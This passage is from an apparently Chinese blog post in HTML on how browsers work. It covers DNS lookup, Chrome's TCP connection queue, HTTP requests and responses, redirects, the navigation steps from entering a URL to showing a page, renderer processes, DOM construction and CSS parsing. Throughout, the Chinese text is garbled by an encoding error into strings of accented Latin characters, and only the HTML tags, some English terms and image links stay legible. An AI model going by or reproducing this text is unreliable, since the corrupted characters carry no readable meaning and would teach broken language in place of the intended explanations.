çš„å†…å®¹æ˜¯é€šè¿‡ TCP çš„ä¼ è¾“æ•°æ®é˜¶æ®µæ¥å®ç°çš„ã€‚</strong></p><p><img src="https://i.loli.net/2021/06/13/nSpi5u2DCcIXR9z.jpg" alt="Snipaste_2021-06-13_19-56-13.jpg"></p><p><strong>ç¬¬ä¸€æ­¥æµè§ˆå™¨ä¼šè¯·æ±‚ DNS è¿”å›åŸŸåå¯¹åº”çš„ IP</strong>ã€‚å½“ç„¶æµè§ˆå™¨è¿˜æä¾›äº†<strong>DNS æ•°æ®ç¼“å­˜æœåŠ¡</strong>ï¼Œå¦‚æœæŸä¸ªåŸŸåå·²ç»è§£æè¿‡äº†ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¼šç¼“å­˜è§£æçš„ç»“æœï¼Œä»¥ä¾›ä¸‹æ¬¡æŸ¥è¯¢æ—¶ç›´æ¥ä½¿ç”¨ï¼Œè¿™æ ·ä¹Ÿä¼šå‡å°‘ä¸€æ¬¡ç½‘ç»œè¯·æ±‚ã€‚</p><p>æ‹¿åˆ° IP ä¹‹åï¼Œæ¥ä¸‹æ¥å°±éœ€è¦è·å–ç«¯å£å·äº†ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œå¦‚æœ URL æ²¡æœ‰ç‰¹åˆ«æŒ‡æ˜ç«¯å£å·ï¼Œé‚£ä¹ˆ HTTP åè®®é»˜è®¤æ˜¯ 80 ç«¯å£ã€‚</p><h3 id="ç­‰å¾…-TCP-é˜Ÿåˆ—"><a href="#ç­‰å¾…-TCP-é˜Ÿåˆ—" class="headerlink" title="ç­‰å¾… TCP é˜Ÿåˆ—"></a>ç­‰å¾… TCP é˜Ÿåˆ—</h3><p>Chrome æœ‰ä¸ªæœºåˆ¶ï¼ŒåŒä¸€ä¸ªåŸŸååŒæ—¶æœ€å¤šåªèƒ½å»ºç«‹ 6 ä¸ª TCP è¿æ¥ï¼Œå¦‚æœåœ¨åŒä¸€ä¸ªåŸŸåä¸‹åŒæ—¶æœ‰ 10 ä¸ªè¯·æ±‚å‘ç”Ÿï¼Œé‚£ä¹ˆå…¶ä¸­ 4 ä¸ªè¯·æ±‚ä¼šè¿›å…¥æ’é˜Ÿç­‰å¾…çŠ¶æ€ï¼Œç›´è‡³è¿›è¡Œä¸­çš„è¯·æ±‚å®Œæˆã€‚å¦‚æœå½“å‰è¯·æ±‚æ•°é‡å°‘äº 6ï¼Œä¼šç›´æ¥è¿›å…¥ä¸‹ä¸€æ­¥ï¼Œå»ºç«‹ TCP è¿æ¥ã€‚</p><h3 id="å»ºç«‹-TCP-è¿æ¥"><a href="#å»ºç«‹-TCP-è¿æ¥" class="headerlink" title="å»ºç«‹ TCP è¿æ¥"></a>å»ºç«‹ TCP è¿æ¥</h3><p>TCPå·¥ä½œæ–¹å¼è§ä¸Šæ–‡ã€‚</p><h3 id="å‘é€-HTTP-è¯·æ±‚"><a href="#å‘é€-HTTP-è¯·æ±‚" class="headerlink" title="å‘é€ HTTP è¯·æ±‚"></a>å‘é€ HTTP è¯·æ±‚</h3><p>HTTP ä¸­çš„æ•°æ®æ­£æ˜¯åœ¨è¿™ä¸ªé€šä¿¡è¿‡ç¨‹ä¸­ä¼ è¾“çš„ã€‚</p><p><img src="https://i.loli.net/2021/06/13/j1Ys4IfaHC9wXoA.jpg" alt="Snipaste_2021-06-13_20-00-16.jpg"></p><p>é¦–å…ˆæµè§ˆå™¨ä¼šå‘æœåŠ¡å™¨å‘é€<strong>è¯·æ±‚è¡Œ</strong>ï¼Œå®ƒåŒ…æ‹¬äº†<strong>è¯·æ±‚æ–¹æ³•ã€è¯·æ±‚ URIå’Œ HTTP ç‰ˆæœ¬åè®®</strong>ã€‚</p><p>è¯·æ±‚è¡Œé‡Œæœ€å¸¸ç”¨çš„è¯·æ±‚æ–¹æ³•æ˜¯ <strong>Get/POSTã€‚</strong>åœ¨æµè§ˆå™¨å‘é€è¯·æ±‚è¡Œå‘½ä»¤ä¹‹åï¼Œè¿˜è¦ä»¥<strong>è¯·æ±‚å¤´</strong>å½¢å¼å‘é€å…¶ä»–ä¸€äº›ä¿¡æ¯ï¼ŒæŠŠæµè§ˆå™¨çš„ä¸€äº›åŸºç¡€ä¿¡æ¯å‘Šè¯‰æœåŠ¡å™¨ã€‚æ¯”å¦‚åŒ…å«äº†æµè§ˆå™¨æ‰€ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿã€æµè§ˆå™¨å†…æ ¸ç­‰ä¿¡æ¯ï¼Œä»¥åŠå½“å‰è¯·æ±‚çš„åŸŸåä¿¡æ¯ã€æµè§ˆå™¨ç«¯çš„ Cookie ä¿¡æ¯ï¼Œç­‰ç­‰ã€‚</p><h2 id="æœåŠ¡å™¨ç«¯å¤„ç†-HTTP-è¯·æ±‚æµç¨‹"><a href="#æœåŠ¡å™¨ç«¯å¤„ç†-HTTP-è¯·æ±‚æµç¨‹" class="headerlink" title="æœåŠ¡å™¨ç«¯å¤„ç† HTTP è¯·æ±‚æµç¨‹"></a>æœåŠ¡å™¨ç«¯å¤„ç† HTTP è¯·æ±‚æµç¨‹</h2><h3 id="è¿”å›è¯·æ±‚"><a href="#è¿”å›è¯·æ±‚" class="headerlink" title="è¿”å›è¯·æ±‚"></a>è¿”å›è¯·æ±‚</h3><p><img src="https://i.loli.net/2021/06/13/qHVi3gnF8pmQLJE.jpg" alt="Snipaste_2021-06-13_20-02-54.jpg"></p><p>æœåŠ¡å™¨ä¼šè¿”å›<strong>å“åº”è¡Œ</strong>ï¼ŒåŒ…æ‹¬åè®®ç‰ˆæœ¬å’ŒçŠ¶æ€ç ã€‚ä¸”é€šè¿‡è¯·æ±‚è¡Œçš„<strong>çŠ¶æ€ç </strong>æ¥å‘Šè¯‰æµè§ˆå™¨å®ƒçš„å¤„ç†ç»“æœã€‚</p><p>æœåŠ¡å™¨ä¹Ÿä¼šéšåŒå“åº”å‘æµè§ˆå™¨å‘é€<strong>å“åº”å¤´</strong>ã€‚å“åº”å¤´åŒ…å«äº†æœåŠ¡å™¨è‡ªèº«çš„ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚æœåŠ¡å™¨ç”Ÿæˆè¿”å›æ•°æ®çš„æ—¶é—´ã€è¿”å›çš„æ•°æ®ç±»å‹ï¼ˆJSONã€HTMLã€æµåª’ä½“ç­‰ç±»å‹ï¼‰ï¼Œä»¥åŠæœåŠ¡å™¨è¦åœ¨å®¢æˆ·ç«¯ä¿å­˜çš„ Cookie ç­‰ä¿¡æ¯ã€‚</p><p>å‘é€å®Œå“åº”å¤´åï¼ŒæœåŠ¡å™¨å°±å¯ä»¥ç»§ç»­å‘é€<strong>å“åº”ä½“</strong>çš„æ•°æ®ï¼Œé€šå¸¸ï¼Œå“åº”ä½“å°±åŒ…å«äº† HTML çš„å®é™…å†…å®¹ã€‚</p><h3 id="æ–­å¼€è¿æ¥"><a href="#æ–­å¼€è¿æ¥" class="headerlink" title="æ–­å¼€è¿æ¥"></a>æ–­å¼€è¿æ¥</h3><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œä¸€æ—¦æœåŠ¡å™¨å‘å®¢æˆ·ç«¯è¿”å›äº†è¯·æ±‚æ•°æ®ï¼Œå®ƒå°±è¦å…³é—­ TCP è¿æ¥ã€‚ä¸è¿‡å¦‚æœæµè§ˆå™¨æˆ–è€…æœåŠ¡å™¨åœ¨å…¶å¤´ä¿¡æ¯ä¸­åŠ å…¥äº†ï¼š<code>Connection:Keep-Alive</code> é‚£ä¹ˆ TCP è¿æ¥åœ¨å‘é€åå°†ä»ç„¶ä¿æŒæ‰“å¼€çŠ¶æ€ï¼Œè¿™æ ·æµè§ˆå™¨å°±å¯ä»¥ç»§ç»­é€šè¿‡åŒä¸€ä¸ª TCP è¿æ¥å‘é€è¯·æ±‚ã€‚<strong>ä¿æŒ TCP è¿æ¥å¯ä»¥çœå»ä¸‹æ¬¡è¯·æ±‚æ—¶éœ€è¦å»ºç«‹è¿æ¥çš„æ—¶é—´ï¼Œæå‡èµ„æºåŠ è½½é€Ÿåº¦</strong>ã€‚</p><h3 id="é‡å®šå‘"><a href="#é‡å®šå‘" class="headerlink" title="é‡å®šå‘"></a>é‡å®šå‘</h3><p>è¿˜æœ‰ä¸€ç§æƒ…å†µéœ€è¦äº†è§£ä¸‹ï¼Œæ¯”å¦‚å½“åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ geekbang.org åï¼Œä¼šå‘ç°æœ€ç»ˆæ‰“å¼€çš„é¡µé¢åœ°å€æ˜¯ <a href="https://www.geekbang.org./">https://www.geekbang.orgã€‚</a></p><p>æ­¤æ—¶æœåŠ¡å™¨å“åº”è¡Œè¿”å›çš„çŠ¶æ€ç æ˜¯ 301ã€‚çŠ¶æ€ 301 å°±æ˜¯å‘Šè¯‰æµè§ˆå™¨ï¼Œæˆ‘éœ€è¦é‡å®šå‘åˆ°å¦å¤–ä¸€ä¸ªç½‘å€ï¼Œè€Œéœ€è¦é‡å®šå‘çš„ç½‘å€æ­£æ˜¯åŒ…å«åœ¨å“åº”å¤´çš„ Location å­—æ®µä¸­ï¼Œæ¥ä¸‹æ¥ï¼Œæµè§ˆå™¨è·å– Location å­—æ®µä¸­çš„åœ°å€ï¼Œå¹¶ä½¿ç”¨è¯¥åœ°å€é‡æ–°å¯¼èˆªï¼Œè¿™å°±æ˜¯ä¸€ä¸ªå®Œæ•´é‡å®šå‘çš„æ‰§è¡Œæµç¨‹ã€‚</p><h2 id="ä»è¾“å…¥URLåˆ°é¡µé¢å±•ç¤ºï¼Œå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿï¼ˆç»å…¸é¢è¯•é¢˜ï¼‰"><a href="#ä»è¾“å…¥URLåˆ°é¡µé¢å±•ç¤ºï¼Œå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿï¼ˆç»å…¸é¢è¯•é¢˜ï¼‰" class="headerlink" title="ä»è¾“å…¥URLåˆ°é¡µé¢å±•ç¤ºï¼Œå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿï¼ˆç»å…¸é¢è¯•é¢˜ï¼‰"></a>ä»è¾“å…¥URLåˆ°é¡µé¢å±•ç¤ºï¼Œå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿï¼ˆç»å…¸é¢è¯•é¢˜ï¼‰</h2><p>â€œä»è¾“å…¥ URL åˆ°é¡µé¢å±•ç¤ºå®Œæ•´æµç¨‹ç¤ºæ„å›¾â€ï¼š</p><p><img src="https://i.loli.net/2021/06/13/4dMoq38AcIE6xzO.jpg" alt="Snipaste_2021-06-13_20-08-17.jpg"></p><p>ä»å›¾ä¸­å¯ä»¥çœ‹å‡ºï¼Œ<strong>æ•´ä¸ªè¿‡ç¨‹éœ€è¦å„ä¸ªè¿›ç¨‹ä¹‹é—´çš„é…åˆã€‚</strong>è¿™ä¸ªè¿‡ç¨‹å¯ä»¥å¤§è‡´æè¿°ä¸ºå¦‚ä¸‹ï¼š</p><ul><li>é¦–å…ˆï¼Œç”¨æˆ·ä»æµè§ˆå™¨è¿›ç¨‹é‡Œ<strong>è¾“å…¥è¯·æ±‚ä¿¡æ¯</strong>ï¼›</li><li>ç„¶åï¼Œç½‘ç»œè¿›ç¨‹<strong>å‘èµ· URL è¯·æ±‚</strong>ï¼›</li><li>æœåŠ¡å™¨å“åº” URL è¯·æ±‚ä¹‹åï¼Œæµè§ˆå™¨è¿›ç¨‹å°±åˆè¦å¼€å§‹<strong>å‡†å¤‡æ¸²æŸ“è¿›ç¨‹</strong>äº†ï¼›</li><li>æ¸²æŸ“è¿›ç¨‹å‡†å¤‡å¥½ä¹‹åï¼Œéœ€è¦å…ˆå‘æ¸²æŸ“è¿›ç¨‹æäº¤é¡µé¢æ•°æ®ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º<strong>æäº¤æ–‡æ¡£</strong>é˜¶æ®µï¼›</li><li>æ¸²æŸ“è¿›ç¨‹æ¥æ”¶å®Œæ–‡æ¡£ä¿¡æ¯ä¹‹åï¼Œä¾¿å¼€å§‹<strong>è§£æé¡µé¢å’ŒåŠ è½½å­èµ„æº</strong>ï¼Œå®Œæˆé¡µé¢çš„æ¸²æŸ“ã€‚</li></ul><h3 id="1-ç”¨æˆ·è¾“å…¥"><a href="#1-ç”¨æˆ·è¾“å…¥" class="headerlink" title="1.ç”¨æˆ·è¾“å…¥"></a><strong>1.ç”¨æˆ·è¾“å…¥</strong></h3><p>å½“ç”¨æˆ·åœ¨åœ°å€æ ä¸­è¾“å…¥ä¸€ä¸ªæŸ¥è¯¢å…³é”®å­—æ—¶ï¼Œåœ°å€æ ä¼šåˆ¤æ–­è¾“å…¥çš„å…³é”®å­—æ˜¯<strong>æœç´¢å†…å®¹</strong>ï¼Œè¿˜æ˜¯<strong>è¯·æ±‚çš„ URL</strong>ã€‚</p><ul><li>å¦‚æœæ˜¯æœç´¢å†…å®¹ï¼Œåœ°å€æ ä¼šä½¿ç”¨æµè§ˆå™¨é»˜è®¤çš„æœç´¢å¼•æ“ï¼Œæ¥åˆæˆæ–°çš„å¸¦æœç´¢å…³é”®å­—çš„ URLã€‚</li><li>å¦‚æœåˆ¤æ–­è¾“å…¥å†…å®¹ç¬¦åˆ URL è§„åˆ™ï¼Œæ¯”å¦‚è¾“å…¥çš„æ˜¯ time.geekbang.orgï¼Œé‚£ä¹ˆåœ°å€æ ä¼šæ ¹æ®è§„åˆ™ï¼ŒæŠŠè¿™æ®µå†…å®¹åŠ ä¸Šåè®®ï¼Œåˆæˆä¸ºå®Œæ•´çš„ URLï¼Œå¦‚ <a href="https://time.geekbang.org./">https://time.geekbang.orgã€‚</a></li></ul><p>å½“ç”¨æˆ·è¾“å…¥å…³é”®å­—å¹¶é”®å…¥å›è½¦ä¹‹åï¼Œæµè§ˆå™¨æ ‡ç­¾é¡µä¸Šçš„å›¾æ ‡ä¾¿è¿›å…¥äº†åŠ è½½çŠ¶æ€ã€‚ä½†æ­¤æ—¶å›¾ä¸­é¡µé¢æ˜¾ç¤ºçš„<strong>ä¾ç„¶æ˜¯ä¹‹å‰æ‰“å¼€çš„é¡µé¢å†…å®¹</strong>ï¼Œå¹¶æ²¡ç«‹å³æ›¿æ¢ä¸ºæå®¢æ—¶é—´çš„é¡µé¢ã€‚å› ä¸ºéœ€è¦ç­‰å¾…æäº¤æ–‡æ¡£é˜¶æ®µï¼Œé¡µé¢å†…å®¹æ‰ä¼šè¢«æ›¿æ¢ã€‚</p><h3 id="2-URLè¯·æ±‚è¿‡ç¨‹"><a href="#2-URLè¯·æ±‚è¿‡ç¨‹" class="headerlink" title="2.URLè¯·æ±‚è¿‡ç¨‹"></a><strong>2.URLè¯·æ±‚è¿‡ç¨‹</strong></h3><p>æµè§ˆå™¨è¿›ç¨‹ä¼šé€šè¿‡è¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰æŠŠ URL è¯·æ±‚å‘é€è‡³ç½‘ç»œè¿›ç¨‹ï¼Œç½‘ç»œè¿›ç¨‹æ¥æ”¶åˆ° URL è¯·æ±‚åï¼Œä¼šåœ¨è¿™é‡Œå‘èµ·çœŸæ­£çš„ URL è¯·æ±‚æµç¨‹ã€‚</p><p>é¦–å…ˆï¼Œç½‘ç»œè¿›ç¨‹ä¼šæŸ¥æ‰¾æœ¬åœ°ç¼“å­˜æ˜¯å¦ç¼“å­˜äº†è¯¥èµ„æºã€‚å¦‚æœæœ‰ç¼“å­˜èµ„æºï¼Œé‚£ä¹ˆç›´æ¥è¿”å›èµ„æºç»™æµè§ˆå™¨è¿›ç¨‹ï¼›å¦‚æœåœ¨ç¼“å­˜ä¸­æ²¡æœ‰æŸ¥æ‰¾åˆ°èµ„æºï¼Œé‚£ä¹ˆç›´æ¥è¿›å…¥ç½‘ç»œè¯·æ±‚æµç¨‹ã€‚è¿™è¯·æ±‚å‰çš„ç¬¬ä¸€æ­¥æ˜¯è¦è¿›è¡Œ DNS è§£æï¼Œä»¥è·å–è¯·æ±‚åŸŸåçš„æœåŠ¡å™¨ IP åœ°å€ã€‚å¦‚æœè¯·æ±‚åè®®æ˜¯ HTTPSï¼Œé‚£ä¹ˆè¿˜éœ€è¦å»ºç«‹ TLS è¿æ¥ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨ IP åœ°å€å’ŒæœåŠ¡å™¨å»ºç«‹ TCP è¿æ¥ã€‚è¿æ¥å»ºç«‹ä¹‹åï¼Œæµè§ˆå™¨ç«¯ä¼šæ„å»ºè¯·æ±‚è¡Œã€è¯·æ±‚å¤´ç­‰ä¿¡æ¯ï¼Œå¹¶æŠŠå’Œè¯¥åŸŸåç›¸å…³çš„ Cookie ç­‰æ•°æ®é™„åŠ åˆ°è¯·æ±‚å¤´ä¸­ï¼Œç„¶åå‘æœåŠ¡å™¨å‘é€æ„å»ºçš„è¯·æ±‚ä¿¡æ¯ã€‚</p><p>æœåŠ¡å™¨æ¥æ”¶åˆ°è¯·æ±‚ä¿¡æ¯åï¼Œä¼šæ ¹æ®è¯·æ±‚ä¿¡æ¯ç”Ÿæˆå“åº”æ•°æ®ï¼ˆåŒ…æ‹¬å“åº”è¡Œã€å“åº”å¤´å’Œå“åº”ä½“ç­‰ä¿¡æ¯ï¼‰ï¼Œå¹¶å‘ç»™ç½‘ç»œè¿›ç¨‹ã€‚ç­‰ç½‘ç»œè¿›ç¨‹æ¥æ”¶äº†å“åº”è¡Œå’Œå“åº”å¤´ä¹‹åï¼Œå°±å¼€å§‹è§£æå“åº”å¤´çš„å†…å®¹äº†ã€‚</p><p><strong>ï¼ˆ1ï¼‰é‡å®šå‘</strong></p><p>åœ¨æ¥æ”¶åˆ°æœåŠ¡å™¨è¿”å›çš„å“åº”å¤´åï¼Œç½‘ç»œè¿›ç¨‹å¼€å§‹è§£æå“åº”å¤´ï¼Œå¦‚æœå‘ç°è¿”å›çš„çŠ¶æ€ç æ˜¯ 301 æˆ–è€… 302ï¼Œé‚£ä¹ˆè¯´æ˜æœåŠ¡å™¨éœ€è¦æµè§ˆå™¨é‡å®šå‘åˆ°å…¶ä»– URLã€‚è¿™æ—¶ç½‘ç»œè¿›ç¨‹ä¼šä»å“åº”å¤´çš„ Location å­—æ®µé‡Œé¢è¯»å–é‡å®šå‘çš„åœ°å€ï¼Œç„¶åå†å‘èµ·æ–°çš„ HTTP æˆ–è€… HTTPS è¯·æ±‚ã€‚</p><p><strong>åœ¨å¯¼èˆªè¿‡ç¨‹ä¸­ï¼Œå¦‚æœæœåŠ¡å™¨å“åº”è¡Œçš„çŠ¶æ€ç åŒ…å«äº† 301ã€302 ä¸€ç±»çš„è·³è½¬ä¿¡æ¯ï¼Œæµè§ˆå™¨ä¼šè·³è½¬åˆ°æ–°çš„åœ°å€ç»§ç»­å¯¼èˆªï¼›å¦‚æœå“åº”è¡Œæ˜¯ 200ï¼Œé‚£ä¹ˆè¡¨ç¤ºæµè§ˆå™¨å¯ä»¥ç»§ç»­å¤„ç†è¯¥è¯·æ±‚</strong>ã€‚</p><p><strong>ï¼ˆ2ï¼‰å“åº”æ•°æ®ç±»å‹å¤„ç†</strong></p><p><strong>Content-Type æ˜¯ HTTP å¤´ä¸­ä¸€ä¸ªéå¸¸é‡è¦çš„å­—æ®µï¼Œ å®ƒå‘Šè¯‰æµè§ˆå™¨æœåŠ¡å™¨è¿”å›çš„å“åº”ä½“æ•°æ®æ˜¯ä»€ä¹ˆç±»å‹</strong>ï¼Œç„¶åæµè§ˆå™¨ä¼šæ ¹æ® Content-Type çš„å€¼æ¥å†³å®šå¦‚ä½•æ˜¾ç¤ºå“åº”ä½“çš„å†…å®¹ã€‚</p><p>å¦‚æœ Content-Type å­—æ®µçš„å€¼è¢«æµè§ˆå™¨åˆ¤æ–­ä¸º<strong>ä¸‹è½½ç±»å‹ï¼Œé‚£ä¹ˆè¯¥è¯·æ±‚ä¼šè¢«æäº¤ç»™æµè§ˆå™¨çš„ä¸‹è½½ç®¡ç†å™¨ï¼ŒåŒæ—¶è¯¥ URL è¯·æ±‚çš„å¯¼èˆªæµç¨‹å°±æ­¤ç»“æŸ</strong>ã€‚ä½†å¦‚æœæ˜¯<strong>HTMLï¼Œé‚£ä¹ˆæµè§ˆå™¨åˆ™ä¼šç»§ç»­è¿›è¡Œå¯¼èˆªæµç¨‹</strong>ã€‚ç”±äº Chrome çš„é¡µé¢æ¸²æŸ“æ˜¯è¿è¡Œåœ¨æ¸²æŸ“è¿›ç¨‹ä¸­çš„ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥å°±éœ€è¦å‡†å¤‡æ¸²æŸ“è¿›ç¨‹äº†ã€‚</p><h3 id="3-å‡†å¤‡æ¸²æŸ“è¿›ç¨‹"><a href="#3-å‡†å¤‡æ¸²æŸ“è¿›ç¨‹" class="headerlink" title="3.å‡†å¤‡æ¸²æŸ“è¿›ç¨‹"></a><strong>3.å‡†å¤‡æ¸²æŸ“è¿›ç¨‹</strong></h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒChrome ä¼šä¸ºæ¯ä¸ªé¡µé¢åˆ†é…ä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹ã€‚ä½†æ˜¯ï¼Œä¹Ÿæœ‰ä¸€äº›ä¾‹å¤–ï¼Œæ¯”å¦‚ä»æå®¢æ—¶é—´çš„é¦–é¡µé‡Œé¢æ‰“å¼€äº†å¦å¤–ä¸€ä¸ªé¡µé¢â€”â€”ç®—æ³•è®­ç»ƒè¥ï¼Œæµè§ˆå™¨ä¼šè®©è¿™ä¸¤ä¸ªé¡µé¢ç›´æ¥è¿è¡Œåœ¨åŒä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹ä¸­ã€‚</p><p>Chrome çš„é»˜è®¤ç­–ç•¥æ˜¯ï¼Œæ¯ä¸ªæ ‡ç­¾å¯¹åº”ä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹ã€‚ä½†<strong>å¦‚æœä»ä¸€ä¸ªé¡µé¢æ‰“å¼€äº†å¦ä¸€ä¸ªæ–°é¡µé¢ï¼Œè€Œæ–°é¡µé¢å’Œå½“å‰é¡µé¢å±äºåŒä¸€ç«™ç‚¹çš„è¯ï¼Œé‚£ä¹ˆæ–°é¡µé¢ä¼šå¤ç”¨çˆ¶é¡µé¢çš„æ¸²æŸ“è¿›ç¨‹</strong>ã€‚</p><p>æ¸²æŸ“è¿›ç¨‹å‡†å¤‡å¥½ä¹‹åï¼Œè¿˜ä¸èƒ½ç«‹å³è¿›å…¥æ–‡æ¡£è§£æçŠ¶æ€ï¼Œå› ä¸ºæ­¤æ—¶çš„æ–‡æ¡£æ•°æ®è¿˜åœ¨ç½‘ç»œè¿›ç¨‹ä¸­ï¼Œå¹¶æ²¡æœ‰æäº¤ç»™æ¸²æŸ“è¿›ç¨‹ï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥å°±è¿›å…¥äº†æäº¤æ–‡æ¡£é˜¶æ®µã€‚</p><h3 id="4-æäº¤æ–‡æ¡£"><a href="#4-æäº¤æ–‡æ¡£" class="headerlink" title="4.æäº¤æ–‡æ¡£"></a><strong>4.æäº¤æ–‡æ¡£</strong></h3><p>è¿™é‡Œçš„â€œæ–‡æ¡£â€æ˜¯æŒ‡ URL è¯·æ±‚çš„å“åº”ä½“æ•°æ®ã€‚</p><ul><li>â€œæäº¤æ–‡æ¡£â€çš„æ¶ˆæ¯æ˜¯ç”±æµè§ˆå™¨è¿›ç¨‹å‘å‡ºçš„ï¼Œæ¸²æŸ“è¿›ç¨‹æ¥æ”¶åˆ°â€œæäº¤æ–‡æ¡£â€çš„æ¶ˆæ¯åï¼Œä¼šå’Œç½‘ç»œè¿›ç¨‹å»ºç«‹ä¼ è¾“æ•°æ®çš„â€œ<strong>ç®¡é“</strong>â€ã€‚</li><li>ç­‰æ–‡æ¡£æ•°æ®ä¼ è¾“å®Œæˆä¹‹åï¼Œæ¸²æŸ“è¿›ç¨‹ä¼šè¿”å›â€œ<strong>ç¡®è®¤æäº¤</strong>â€çš„æ¶ˆæ¯ç»™æµè§ˆå™¨è¿›ç¨‹ã€‚</li><li>æµè§ˆå™¨è¿›ç¨‹åœ¨æ”¶åˆ°â€œç¡®è®¤æäº¤â€çš„æ¶ˆæ¯åï¼Œä¼š<strong>æ›´æ–°æµè§ˆå™¨ç•Œé¢çŠ¶æ€</strong>ï¼ŒåŒ…æ‹¬äº†å®‰å…¨çŠ¶æ€ã€åœ°å€æ çš„ URLã€å‰è¿›åé€€çš„å†å²çŠ¶æ€ï¼Œå¹¶æ›´æ–° Web é¡µé¢ã€‚</li></ul><p>æ›´æ–°å†…å®¹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://i.loli.net/2021/06/13/Nf2UvQTo6WeCsGi.jpg" alt="Snipaste_2021-06-13_20-22-46.jpg"></p><p>åˆ°è¿™é‡Œï¼Œä¸€ä¸ªå®Œæ•´çš„å¯¼èˆªæµç¨‹å°±â€œèµ°â€å®Œäº†ï¼Œè¿™ä¹‹åå°±è¦è¿›å…¥æ¸²æŸ“é˜¶æ®µäº†ã€‚</p><h3 id="5-æ¸²æŸ“é˜¶æ®µ"><a href="#5-æ¸²æŸ“é˜¶æ®µ" class="headerlink" title="5.æ¸²æŸ“é˜¶æ®µ"></a><strong>5.æ¸²æŸ“é˜¶æ®µ</strong></h3><p>ä¸€æ—¦é¡µé¢ç”Ÿæˆå®Œæˆï¼Œæ¸²æŸ“è¿›ç¨‹ä¼šå‘é€ä¸€ä¸ªæ¶ˆæ¯ç»™æµè§ˆå™¨è¿›ç¨‹ï¼Œæµè§ˆå™¨æ¥æ”¶åˆ°æ¶ˆæ¯åï¼Œä¼šåœæ­¢æ ‡ç­¾å›¾æ ‡ä¸Šçš„åŠ è½½åŠ¨ç”»ã€‚</p><h2 id="HTMLã€CSSå’ŒJavaScriptï¼Œæ˜¯å¦‚ä½•å˜æˆé¡µé¢çš„ï¼Ÿï¼ˆæ¸²æŸ“è¿›ç¨‹ï¼‰"><a href="#HTMLã€CSSå’ŒJavaScriptï¼Œæ˜¯å¦‚ä½•å˜æˆé¡µé¢çš„ï¼Ÿï¼ˆæ¸²æŸ“è¿›ç¨‹ï¼‰" class="headerlink" title="HTMLã€CSSå’ŒJavaScriptï¼Œæ˜¯å¦‚ä½•å˜æˆé¡µé¢çš„ï¼Ÿï¼ˆæ¸²æŸ“è¿›ç¨‹ï¼‰"></a>HTMLã€CSSå’ŒJavaScriptï¼Œæ˜¯å¦‚ä½•å˜æˆé¡µé¢çš„ï¼Ÿï¼ˆæ¸²æŸ“è¿›ç¨‹ï¼‰</h2><p>æŒ‰ç…§æ¸²æŸ“çš„æ—¶é—´é¡ºåºï¼Œæµæ°´çº¿å¯åˆ†ä¸ºå¦‚ä¸‹å‡ ä¸ªå­é˜¶æ®µï¼šæ„å»º DOM æ ‘ã€æ ·å¼è®¡ç®—ã€å¸ƒå±€é˜¶æ®µã€åˆ†å±‚ã€ç»˜åˆ¶ã€åˆ†å—ã€å…‰æ …åŒ–å’Œåˆæˆã€‚</p><h3 id="æ„å»º-DOM-æ ‘"><a href="#æ„å»º-DOM-æ ‘" class="headerlink" title="æ„å»º DOM æ ‘"></a>æ„å»º DOM æ ‘</h3><p>ä¸ºä»€ä¹ˆè¦æ„å»º DOM æ ‘å‘¢ï¼Ÿ<strong>è¿™æ˜¯å› ä¸ºæµè§ˆå™¨æ— æ³•ç›´æ¥ç†è§£å’Œä½¿ç”¨ HTMLï¼Œæ‰€ä»¥éœ€è¦å°† HTML è½¬æ¢ä¸ºæµè§ˆå™¨èƒ½å¤Ÿç†è§£çš„ç»“æ„â€”â€”DOM æ ‘</strong>ã€‚</p><p><img src="https://i.loli.net/2021/06/13/LmIKEagyHOruVZi.jpg" alt="Snipaste_2021-06-13_20-39-22.jpg"></p><p>ä»å›¾ä¸­å¯ä»¥çœ‹å‡ºï¼Œæ„å»º DOM æ ‘çš„<strong>è¾“å…¥å†…å®¹</strong>æ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„ HTML æ–‡ä»¶ï¼Œç„¶åç»ç”± HTML è§£æå™¨è§£æï¼Œæœ€ç»ˆè¾“å‡ºæ ‘çŠ¶ç»“æ„çš„ DOMã€‚</p><h3 id="æ ·å¼è®¡ç®—"><a href="#æ ·å¼è®¡ç®—" class="headerlink" title="æ ·å¼è®¡ç®—"></a>æ ·å¼è®¡ç®—</h3><p><strong>1. æŠŠ CSS è½¬æ¢ä¸ºæµè§ˆå™¨èƒ½å¤Ÿç†è§£çš„ç»“æ„</strong></p><p>CSS æ ·å¼æ¥æºä¸»è¦æœ‰ä¸‰ç§ï¼š</p><ul><li>é€šè¿‡ link å¼•ç”¨çš„å¤–éƒ¨ CSS æ–‡ä»¶</li><li><code>&lt;style&gt;</code>æ ‡è®°å†…çš„ CSS</li><li>å…ƒç´ çš„ style å±æ€§å†…åµŒçš„ CSS</li></ul><p>å’Œ HTML æ–‡ä»¶ä¸€æ ·ï¼Œæµè§ˆå™¨ä¹Ÿæ˜¯æ— æ³•ç›´æ¥ç†è§£è¿™äº›çº¯æ–‡æœ¬çš„ CSS æ ·å¼ï¼Œæ‰€ä»¥<strong>å½“æ¸²æŸ“å¼•æ“æ¥æ”¶åˆ° CSS æ–‡æœ¬æ—¶ï¼Œä¼šæ‰§è¡Œä¸€ä¸ªè½¬æ¢æ“ä½œï¼Œå°† CSS æ–‡æœ¬è½¬æ¢ä¸ºæµè§ˆå™¨å¯ä»¥ç†è§£çš„ç»“æ„â€”â€”styleSheets</strong>ã€‚</p><p><strong>2. è½¬æ¢æ 